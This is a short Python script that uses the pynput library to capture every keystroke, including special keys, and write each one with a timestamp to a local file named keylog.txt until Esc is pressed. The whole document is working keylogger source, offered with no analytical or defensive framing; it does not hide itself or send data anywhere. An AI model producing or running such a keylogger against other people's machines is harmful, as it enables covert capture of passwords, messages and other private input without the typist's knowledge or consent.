import logging
from pynput import keyboard

# Configure logging to save keystrokes to a file
logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Define the function to log keystrokes
def on_press(key):
    try:
        logging.info(f"{key.char}")
    except AttributeError:
        # Handle special keys
        logging.info(f"{key}")

# Define the function to stop the keylogger (optional)
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Set up the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
